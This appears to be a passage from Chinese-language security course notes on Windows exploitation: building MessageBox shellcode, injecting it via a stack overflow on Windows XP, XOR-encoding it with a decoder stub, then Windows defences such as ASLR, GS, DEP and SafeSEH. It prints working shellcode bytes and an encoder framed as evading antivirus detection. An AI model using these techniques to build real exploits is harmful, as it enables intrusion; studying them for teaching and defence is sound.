plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FARPROC GetProcAddress(</span><br><span class="line"> HMODULE hModule, // DLL 模块句柄</span><br><span class="line"> LPCSTR lpProcName // 函数名</span><br><span class="line">);</span><br></pre></td></tr></table></figure><ul><li>参数hModule<strong>包含此函数的DLL模块的句柄</strong>。<code>LoadLibrary</code>、AfxLoadLibrary或者<code>GetModuleHandle</code>函数可以返回此句柄。</li><li>参数lpProcName是包含函数名的以NULL结尾的字符串，或者指定函数的序数值。</li><li>FARPROC是一个4字节指针，指向一个函数的内存地址，GetProcAddress的返回类型就是FARPROC。如果你要存放这个地址，可以声明以一个FARPROC变量来存放。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123; </span><br><span class="line">        HINSTANCE LibHandle;</span><br><span class="line">        FARPROC ProcAdd;</span><br><span class="line">        LibHandle = LoadLibrary(&quot;user32&quot;);</span><br><span class="line">        //获取user32.dll的地址</span><br><span class="line">        printf(&quot;user32 = 0x%x \n&quot;, LibHandle);</span><br><span class="line">        //获取MessageBoxA的地址</span><br><span class="line">        ProcAdd=(FARPROC)GetProcAddress(LibHandle,&quot;MessageBoxA&quot;);</span><br><span class="line">        printf(&quot;MessageBoxA = 0x%x \n&quot;, ProcAdd);</span><br><span class="line">        getchar();</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br><span class="line">//运行代码可以得到入口地址：0x77D507EA</span><br></pre></td></tr></table></figure><p><strong>第二步：编写函数调用的汇编代码</strong></p><blockquote><p>编写函数调用的汇编代码：先把<strong>字符串“westwest”</strong>压入栈区，消息框的文本和标题都显示为“westwest”，只要<strong>重复压入指向这个字符串的指针</strong>即可；第1个和第4个参数这里都将设置为NULL。</p></blockquote><table><thead><tr><th>机器代码</th><th>汇编指令</th><th>注释</th></tr></thead><tbody><tr><td>33 DB</td><td>XOR  EBX,EBX</td><td>将EBX的值设置为0</td></tr><tr><td>53</td><td>PUSH  EBX</td><td>将EBX的值入栈</td></tr><tr><td>68 77 65 73 74</td><td>PUSH  74736577</td><td>将字符串west入栈</td></tr><tr><td>68 77 65 73 74</td><td>PUSH  74736577</td><td>将字符串west入栈</td></tr><tr><td>8B C4</td><td>MOV  EAX,ESP</td><td>将栈顶指针存入EAX（栈顶指针的值就是字符串的首地址）</td></tr><tr><td>53</td><td>PUSH   EBX</td><td>入栈Messagebox的参数-类型</td></tr><tr><td>50</td><td>PUSH   EAX</td><td>入栈Messagebox的参数-标题</td></tr><tr><td>50</td><td>PUSH   EAX</td><td>入栈Messagebox的参数-消息</td></tr><tr><td>53</td><td>PUSH   EBX</td><td>入栈Messagebox的参数-句柄</td></tr><tr><td>B8 EA 07 D5 77</td><td>MOV EAX, 0x77D507EA</td><td></td></tr><tr><td>FF D0</td><td>CALL EAX</td><td>调用MessageBoxA函数，注意，每个机器的该函数的入口地址不同，请<strong>按实际值写入</strong>。</td></tr></tbody></table><p><strong>第三步：注入Shellcode代码</strong></p><p>得到的shellcode为：33 DB 53 68 77 65 73 74 68 77 65 73 74 8B C4 53 50 50 53 B8 EA 07 D5 77 FF D0。<br>将这段shellcode写入reg.txt文件，且在返回地址处写buffer的地址。<br><code>Buffer的地址可以通过OllyDbg来查看得到，也可以通过VC6的转到反汇编方式来得到：0012FAF0。</code>用nop指令填充空余部分(ASCII值：90)</p><p><img src="/2023/03/14/lou-dong-li-yong-pian/635c4861c2059e67bb283fa34dddf417.png" class="lazyload placeholder" data-srcset="/2023/03/14/lou-dong-li-yong-pian/635c4861c2059e67bb283fa34dddf417.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>注意：Windows xp下静态 API 的地址是准的，windows XP之后的操作系统版本增加了<strong>ASLR 保护机制</strong>，地址就不准，就得<strong>动态获取</strong>了，利用地址定位技术或者通用型Shellcode编写可以解决这个问题。 </p><h1 id="Shellcode编写"><a href="#Shellcode编写" class="headerlink" title="Shellcode编写"></a>Shellcode编写</h1><h2 id="Shellcode编写的难点"><a href="#Shellcode编写的难点" class="headerlink" title="Shellcode编写的难点"></a>Shellcode编写的难点</h2><p>由于漏洞发现者在漏洞发现之初并不会给出完整Shellcode，因此掌握Shellcode编写技术就显得尤为重要。但是，要编写Shellcode存在很多难点：</p><ol><li><strong>对一些特定字符需要转码</strong>。比如，对于strcpy等函数造成的缓冲区溢出，会认为NULL是字符串的终结，所以shellcode中不能有NULL，如果有需要则要进行变通或编码。</li><li><strong>函数API的定位很困难</strong>。比如，在Windows系统下，系统调用多数都是封装在高级API中来调用的，而且不同的Service Pack或版本的操作系统其API都可能有所改动，所以不可能直接调用。因此，需要采用<strong>动态的方法获取API地址</strong>。</li></ol><h2 id="简单编写Shellcode的方法"><a href="#简单编写Shellcode的方法" class="headerlink" title="简单编写Shellcode的方法"></a>简单编写Shellcode的方法</h2><p>一种简单的编写Shellcode的方法的步骤如下：</p><h3 id="第一步：用c语言书写要执行的Shellcode"><a href="#第一步：用c语言书写要执行的Shellcode" class="headerlink" title="第一步：用c语言书写要执行的Shellcode"></a>第一步：用c语言书写要执行的Shellcode</h3><p>使用VC6编写程序如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    MessageBox(NULL,NULL,NULL,0);</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="第二步：换成对应的汇编代码"><a href="#第二步：换成对应的汇编代码" class="headerlink" title="第二步：换成对应的汇编代码"></a>第二步：换成对应的汇编代码</h3><p>利用调试功能，找到其对应的汇编代码：</p><p><img src="/2023/03/14/lou-dong-li-yong-pian/a99f990d555c8fbbad47157005d5bf9a.png" class="lazyload placeholder" data-srcset="/2023/03/14/lou-dong-li-yong-pian/a99f990d555c8fbbad47157005d5bf9a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><code>直接得到的汇编语言通常需要进行再加工。对于push 0而言，可以通过上述的xor ebx ebx之后执行push ebx来实现。</code></p><p>在工程中编写汇编语言如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">void main()&#123;</span><br><span class="line">    LoadLibrary(&quot;user32.dll&quot;);//加载user32.dll</span><br><span class="line">  _asm</span><br><span class="line">  &#123;</span><br><span class="line">      xor ebx,ebx</span><br><span class="line">      push ebx//push 0，push 0的机器代码会出现一个字节的0，对于直接利用需要解决字节为0的问题，因此转换为push ebx</span><br><span class="line">      push ebx</span><br><span class="line">      push ebx</span><br><span class="line">      push ebx</span><br><span class="line">    mov eax, 77d507eah// 77d507eah是MessageBox函数在系统中的地址</span><br><span class="line">      call eax</span><br><span class="line">  &#125;</span><br><span class="line">  return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="第三步：根据汇编代码，找到对应地址中的机器码"><a href="#第三步：根据汇编代码，找到对应地址中的机器码" class="headerlink" title="第三步：根据汇编代码，找到对应地址中的机器码"></a>第三步：根据汇编代码，找到对应地址中的机器码</h3><p>在汇编第一行代码处打断点，利用调试定位具体内存中的地址：</p><p><img src="/2023/03/14/lou-dong-li-yong-pian/c58fa397f5aebffcee94d5abdd6a0ef1.png" class="lazyload placeholder" data-srcset="/2023/03/14/lou-dong-li-yong-pian/c58fa397f5aebffcee94d5abdd6a0ef1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><code>这样，在Memory窗口就可以找到对应的机器码：33 DB 53 53 53 53 B8 EA 07 D5 77 FF D0。</code></p><p>接下来就可以利用这个Shellcode来实现漏洞的利用了，一个VC6测试程序如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">char ourshellcode[]=&quot;\x33\xDB\x53\x53\x53\x53\xB8\xEA\x07\xD5\x77\xFF\xD0&quot;;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    LoadLibrary(&quot;user32.dll&quot;);</span><br><span class="line">    int *ret;</span><br><span class="line">    ret=(int*)&amp;ret+2;//指向返回地址</span><br><span class="line">    (*ret)=(int)ourshellcode;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="编写输出“hello-world”的Shellcode"><a href="#编写输出“hello-world”的Shellcode" class="headerlink" title="编写输出“hello world”的Shellcode"></a>编写输出“hello world”的Shellcode</h2><ul><li>4字节存入，硬编码空格是0x20；不足4字节，可以在最后的字节里补空格。“hello world” ASCII码为：\x68\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x20。</li><li>入栈的话，需要倒着来；考虑big endian编码，存储顺序也得倒过来。</li></ul><p>利用ESP来获取字符串的地址，编写的shellcode代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">_asm</span><br><span class="line">&#123;</span><br><span class="line">    xor ebx,ebx</span><br><span class="line">    push ebx//push 0</span><br><span class="line">    push 20646C72h</span><br><span class="line">    push 6F77206Fh</span><br><span class="line">    push 6C6C6568h</span><br><span class="line">    mov eax, esp</span><br><span class="line">    </span><br><span class="line">    push ebx//push 0</span><br><span class="line">    push eax</span><br><span class="line">    push eax</span><br><span class="line">    push ebx</span><br><span class="line">  mov eax, 77d507eah// 77d507eah这个是MessageBox函数在系统中的地址</span><br><span class="line">    call eax</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提取到的 shellcode 代码为：<br>\x33\xDB\x53\x68\x72\x6C\x64\x20\x68\x6F\x20\x77\x6F\x68\x68\x65\x6C\x6C\x8B\xC4\x53\x50\x50\x53\xB8\xEA\x07\xD5\x77\xFF\xD0</p><p>可以使用上述程序实验。</p><h1 id="Shellcode编码"><a href="#Shellcode编码" class="headerlink" title="Shellcode编码"></a>Shellcode编码</h1><h2 id="Shellcode编码的必要性"><a href="#Shellcode编码的必要性" class="headerlink" title="Shellcode编码的必要性"></a>Shellcode编码的必要性</h2><p>Shellcode代码编制过程通常需要进行编码，因为：</p><ul><li><strong>字符集的差异</strong>。应用程序应用平台的不同，可能的字符集会有差异，限制exploit的稳定性。</li><li><strong>绕过坏字符</strong>。针对某个应用，可能对某些“坏字符”变形或者截断而破坏exploit，比如strcpy函数对NULL字符的不可接纳性，再比如很多应用在某些处理流程中可能会限制0x0D（\r）、0x0A（\n）或者0x20（空格）字符。</li><li><strong>绕过安全防护检测</strong>。有很多安全检测工具是根据漏洞相应的exploit脚本特征做的检测，所以变形exploit在一定程度上可以“免杀”。</li></ul><h2 id="Shellcode编码方法"><a href="#Shellcode编码方法" class="headerlink" title="Shellcode编码方法"></a>Shellcode编码方法</h2><p><strong>网页Shellcode</strong>。对于网页Shellcode，可以采用<strong>base64编码</strong>。Base64是网络上最常见的用于传输8Bit字节码的编码方式之一，是一种基于64个可打印字符来表示二进制数据的方法。<br><strong>二进制机器代码</strong>。对于二进制Shellcode机器代码的编码，通常采用类似“<strong>加壳</strong>”思想的手段，采用：</p><ol><li><strong>自定义编码</strong>(异或编码、计算编码、简单加解密等)的方法完成shellcode的编码；</li><li>通过精心构造<strong>精简干练的解码程序</strong>，放在shellcode开始执行的地方，完成shellcode的<strong>编解码</strong>；当exploit成功时，shellcode顶端的<u>解码程序首先运行</u>，它会<u>在内存中将真正的shellcode还原成原来的样子</u>，然后执行。</li></ol><br/><h3 id="异或编码"><a href="#异或编码" class="headerlink" title="异或编码"></a>异或编码</h3><p>异或编码是一种简单易用的shellcode编码方法，它的编解码程序非常简单。<br>但是它也存在很多限制，比如在选取编码字节时，不可与已有字节相同，否则会出现0。</p><h4 id="编码程序"><a href="#编码程序" class="headerlink" title="编码程序"></a>编码程序</h4><p><strong>编码程序，是独立的</strong>。是在生成shellcode的编码阶段使用。将shellcode代码输入后，输出异或后的shellcode编码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">void encoder(char* input, unsigned char key)</span><br><span class="line">&#123;</span><br><span class="line">    int i = 0, len = 0;     </span><br><span class="line">    len = strlen(input);</span><br><span class="line">    unsigned char * output =  (unsigned char *)malloc(len + 1);        </span><br><span class="line">    for (i = 0; i&lt;len; i++)</span><br><span class="line">        output[i] = input[i] ^ key; </span><br><span class="line">    ……输出到文件中….</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">    char sc[]=“0xAE………………………0x90”;</span><br><span class="line">    encoder(sc, 0x44);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="解码程序"><a href="#解码程序" class="headerlink" title="解码程序"></a>解码程序</h4><p><strong>解码程序是shellcode的一部分</strong>。下面的解码程序中，<u>默认EAX在shellcode开始时对准shellcode起始位置</u>，程序将每次将shellcode的代码异或特定key（0x44）后重新覆盖原先shellcode的代码。末尾，放一个空指令0x90作为结束符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">      add eax, 0x14 ;  越过decoder，假设eax对准当前这条指令的地址</span><br><span class="line">      xor ecx, ecx</span><br><span class="line">    decode_loop:</span><br><span class="line">      mov bl, [eax + ecx]</span><br><span class="line">      xor bl, 0x44             ;用0x44作为key</span><br><span class="line">      mov [eax + ecx], bl</span><br><span class="line">      inc ecx</span><br><span class="line">      cmp bl, 0x90             ;末尾放一个0x90作为结束符</span><br><span class="line">      jne decode_loop</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="获取代码当前指令地址"><a href="#获取代码当前指令地址" class="headerlink" title="获取代码当前指令地址"></a>获取代码当前指令地址</h4><p>怎么让eax记录shellcode当前的起始地址？看如下代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main(int argc, char const *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    unsigned int temp;    </span><br><span class="line">    __asm&#123;</span><br><span class="line">        call lable;</span><br><span class="line">      lable:</span><br><span class="line">        pop eax;</span><br><span class="line">        mov temp,eax;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt;temp &lt;&lt;endl;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">//Call会执行push EIP；EIP的值又是下一条指令pop EAX的地址</span><br><span class="line">//Pop Eax会将栈顶EIP（自身指令地址）出栈，保存到EAX中</span><br></pre></td></tr></table></figure><p>核心语句在于<code>“call lable; lable: pop eax;”</code>之后，eax 的值就是当前指令地址了。<br>原因是<code>call lable</code>的时候，会将当前 EIP 的值（也就是下一条指令 pop eax 的指令地址）入栈。</p><p>因此，我们通过下面的程序来产生含有解码程序的 Shellcode：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">int main()&#123;</span><br><span class="line">   __asm  &#123;</span><br><span class="line">     call lable; </span><br><span class="line">    lable: pop eax; </span><br><span class="line">     //EAX指向pop eax地址0x14-&gt;0X15</span><br><span class="line">        add eax, 0x15            ;越过decoder记录shellcode起始地址</span><br><span class="line">        xor ecx, ecx</span><br><span class="line">    decode_loop:</span><br><span class="line">        mov bl, [eax + ecx]</span><br><span class="line">        xor bl, 0x44             ;用0x44作为key</span><br><span class="line">        mov [eax + ecx], bl</span><br><span class="line">        inc ecx</span><br><span class="line">        cmp bl, 0x90             ;末尾放一个0x90作为结束符</span><br><span class="line">        jne decode_loop </span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提取到的机器码是”\xE8\x00\x00\x00\x00\x58\x83\xC0\x15\x33\xC9\x8A\x1C\x08\x80\xF3\x44\x88\x1C\x08\x41\x80\xFB\x90\x75\xF1”</p><h4 id="完整的shellcode代码"><a href="#完整的shellcode代码" class="headerlink" title="完整的shellcode代码"></a>完整的shellcode代码</h4><p>后面跟上任意的编码后的shellcode形成完整的可利用的shellcode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">char ourshellcode[]=&quot;\xE8\x00\x00\x00\x00\x58\x83\xC0\x15\x33\xC9\x8A\x1C\x08\x80\xF3\x44\x88\x1C\x08\x41\x80\xFB\x90\x75\xF1\x77\x9f\x17\x2c\x36\x28\x20\x64\x2c\x2b\x64\x33\x2b\x2c\x2c\x21\x28\x28\xcf\x80\x17\x14\x14\x17\xfc\xae\x43\x91\x33\xbb\x94\xd4&quot;;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    LoadLibrary(&quot;user32.dll&quot;);</span><br><span class="line">    int *ret;</span><br><span class="line">    ret=(int*)&amp;ret+2;</span><br><span class="line">    (*ret)=(int)ourshellcode;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Windows安全防护技术"><a href="#Windows安全防护技术" class="headerlink" title="Windows安全防护技术"></a>Windows安全防护技术</h1><p>由于C、C++等高级程序语言在<strong>边界检查方面存在的不足</strong>，致使缓冲区溢出漏洞等多种软件漏洞已成为信息系统安全的主要威胁之一，尤其对于使用广泛的Windows操作系统及其应用程序造成了极大的危害。为了能在操作系统层面提供对软件漏洞的防范，Windows操作系统自Vista版本开始，到现在普遍采用的Windows7/8/10等版本，陆续提供了多种防范措施和手段，对于提高Windows操作系统抵御漏洞攻击起到了关键作用。</p><p>下面介绍Windows操作系统中提供的主要几种软件漏洞利用的防范技术。</p><h2 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h2><p>**地址空间分布随机化ASLR(addressspace layout randomization)**是一项通过将<u>系统关键地址随机化</u>，&lt;从而使攻击者无法获得需要跳转的精确地址的技术。</p><p><strong>Shellcode需要调用一些系统函数才能实现系统功能达到攻击目的</strong>，因为这些函数的地址往往是系统DLL（如kernel32. Dll）、可执行文件本身、栈数据或PEB（Process Environment Block，进程环境块）中的<strong>固定调用地址</strong>，所以为shellcode的调用提供了方便。</p><p>对于ASLR技术，微软从<strong>操作系统加载时的地址变化</strong>和<strong>可执行程序编译时的编译器选项</strong>两个方面进行了实现和完善。</p><h3 id="系统加载地址变化"><a href="#系统加载地址变化" class="headerlink" title="系统加载地址变化"></a>系统加载地址变化</h3><ul><li>ASLR随机化的关键系统地址包括: <strong>PE文件(exe文件和dll文件)映像加载地址</strong>、<strong>堆栈基址</strong>、<strong>堆地址</strong>、<strong>PEB和TEB（Thread Environment Block，线程环境块）地址</strong>等。</li><li>在Windows Vista上，当程序启动将执行文件加载到内存时，操作系统通过内核模块提供的ASLR功能，在原来映像基址的基础上加上一个<strong>随机数</strong>作为新的映像基址。</li><li>随机数的取值范围限定为1至254，并保证每个数值随机出现。</li></ul><h3 id="编译器选项-DYNAMICBASE"><a href="#编译器选项-DYNAMICBASE" class="headerlink" title="编译器选项-DYNAMICBASE"></a>编译器选项-DYNAMICBASE</h3><p>VS 2005及更高版本提供了选项/DYNAMICBASE，使用了该选项之后，编译后的程序每次运行时，其内部的栈等结构的地址都会被随机化。</p><h3 id="查看地址变化情况"><a href="#查看地址变化情况" class="headerlink" title="查看地址变化情况"></a>查看地址变化情况</h3><p>实验四：在Windows 7及以后的操作系统里运行下述程序，查看地址变化情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#define DLL_NAME &quot;kernel32.dll&quot;</span><br><span class="line">unsigned long gvar = 0;</span><br><span class="line">void PrintAddress() &#123;</span><br><span class="line">    printf(&quot;PrintAddress的地址:%p \n&quot;, PrintAddress);</span><br><span class="line">    gvar++;</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;  </span><br><span class="line">    HINSTANCE handle;</span><br><span class="line">    handle = LoadLibrary(DLL_NAME);</span><br><span class="line">    if (!handle) &#123;</span><br><span class="line">       printf(&quot; load dll erro !&quot;);  exit(0);</span><br><span class="line">    &#125; </span><br><span class="line">    printf(&quot;Kernel32.dll文件库的地址： 0x%x\n&quot;, handle);</span><br><span class="line">    void *pvAddress = GetProcAddress(handle, &quot;LoadLibraryW&quot;);</span><br><span class="line">    printf(&quot;LoadLibrary函数地址：%p \n&quot;, pvAddress);</span><br><span class="line">    PrintAddress();</span><br><span class="line">    printf(&quot;变量gvar的地址：%p \n&quot;, &amp;gvar);</span><br><span class="line">    system(&quot;pause&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>GetProcAddress函数可以获得DLL中的函数地址</code></p><h2 id="GS-Stack-protection"><a href="#GS-Stack-protection" class="headerlink" title="GS Stack protection"></a>GS Stack protection</h2><p>GS Stack Protection技术是一项缓冲区溢出的检测防护技术。VC++编译器中提供了一个/GS编译选项，在使用VC7.0、Visual Studio 2005及后续版本编译时都支持该选项，如选择该选项，<strong>编译器针对函数调用和返回时添加保护和检查功能的代码，在函数被调用时，在缓冲区和函数返回地址增加一个32位的随机数</strong>security_cookie，在函数返回时，调用检查函数检查security_cookie的值是否有变化。</p><p><img src="/2023/03/14/lou-dong-li-yong-pian/d979a332b8a3b0c49b7a9371f7448927.png" class="lazyload placeholder" data-srcset="/2023/03/14/lou-dong-li-yong-pian/d979a332b8a3b0c49b7a9371f7448927.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>security_cookie在进程启动时</li></ul><p><code>security_cookie</code>在进程启动时会随机产生，并且<strong>它的原始存储地址因Windows操作系统的ASLR机制也是随机存放的</strong>，攻击者无法对security_cookie进行篡改。</p><ul><li>当发生栈缓冲区溢出攻击时</li></ul><p>当发生栈缓冲区溢出攻击时，对返回地址或其他指针进行覆盖的同时，会覆盖security_cookie的值，因此在函数调用结束返回时，对security_cookie进行检查就会发现它的值变化了，从而发现缓冲区溢出的操作。</p><p><font color=red>GS技术对基于栈的缓冲区溢出攻击能起到很好的防范作用。</font></p><h2 id="DEP"><a href="#DEP" class="headerlink" title="DEP"></a>DEP</h2><p>**数据执行保护DEP(data execute prevention)**技术可以限制内存堆栈区的代码为不可执行状态，从而防范溢出后代码的执行。</p><p>Windows操作系统中，默认情况下将包含执行代码和DLL文件的.text段即代码段的内存区域设置为可执行代码的内存区域。其他的内存区域不包含执行代码，应该不能具有代码执行权限，但是<strong>Windows XP及其之前的操作系统，没有对这些内存区域的代码执行进行限制</strong>。因此，对于缓冲区溢出攻击，攻击者能够对内存的堆栈或堆的缓冲区进行覆盖操作，并执行写入的shellcode代码。</p><p>启用DEP机制后，DEP机制将这些敏感区域设置不可执行的<strong>non-executable标志位</strong>，因此在溢出后即使跳转到恶意代码的地址，恶意代码也将无法运行，从而有效地阻止了缓冲区溢出攻击的执行。</p><p>DEP分为<strong>软件DEP和硬件DEP</strong>。硬件DEP需要CPU的支持,需要CPU在<strong>页表</strong>增加一个保护位NX(no execute)，来控制页面是否可执行。现在CPU一般都支持硬件NX，所以现在的DEP保护机制一般都采用的硬件DEP，对于DEP设置non-executable标志位的内存区域，CPU会添加NX保护位来控制内存区域的代码执行。</p><p>此外，Visual Studio编译器提供了一个链接标志/NXCOMPAT，可以在生成目标应用程序的时候使程序启用DEP保护。</p><h2 id="SafeSEH"><a href="#SafeSEH" class="headerlink" title="SafeSEH"></a>SafeSEH</h2><h3 id="回顾SEH"><a href="#回顾SEH" class="headerlink" title="回顾SEH"></a>回顾SEH</h3><p><strong>SEH（Structured Exception Handler）</strong>是Windows异常处理机制所采用的重要数据结构链表。程序设计者可以根据自身需要，定义程序发生各种异常时相应的处理函数，保存在SEH中。</p><p>通过精心构造，攻击者通过<strong>缓冲区溢出覆盖</strong>SEH中异常处理函数句柄，将其替换为指向恶意代码shellcode的地址，并触发相应异常，从而使程序流程转向执行恶意代码。</p><h3 id="SafeSEH-1"><a href="#SafeSEH-1" class="headerlink" title="SafeSEH"></a>SafeSEH</h3><p>SafeSEH就是一项保护SEH函数不被非法利用的技术。<strong>微软在编译器中加入了/SafeSEH选项</strong>，采用该选项编译的程序将PE文件中所有合法的SEH异常处理函数的地址解析出来制成一张<strong>SEH函数表</strong>，放在PE文件的数据块中,用于异常处理时候进行匹配检查。</p><p>在该PE文件被加载时，系统读出该SEH函数表的地址，使用内存中的一个随机数加密，将<strong>加密后的SEH函数表</strong>地址、模块的基址、模块的大小、合法SEH函数的个数等信息，放入<strong>ntdll.dll的SEHIndex结构中</strong>。</p><p>在PE文件运行中，如果需要调用异常处理函数，系统会调用加解密函数解密从而获得SEH函数表地址，然后<u>针对程序的每个异常处理函数检查是否在合法的SEH函数表中</u>，如果没有则说明该函数非法，将终止异常处理。<u>接着要检查异常处理句柄是否在栈上，如果在栈上也将停止异常处理</u>。这两个检测可以防止在堆上伪造异常链和把shellcode放置在栈上的情况，最后还要检测异常处理函数句柄的有效性。</p><blockquote><p>从Vista开始，由于系统PE文件在编译时都采用SafeSEH编译选项，因此以前那种通过覆盖异常处理句柄的漏洞利用技术，也就不能正常使用了。</p></blockquote><h2 id="SEHOP"><a href="#SEHOP" class="headerlink" title="SEHOP"></a>SEHOP</h2><p><strong>结构化异常处理覆盖保护SEHOP（Structured Exception Handler Overwrite 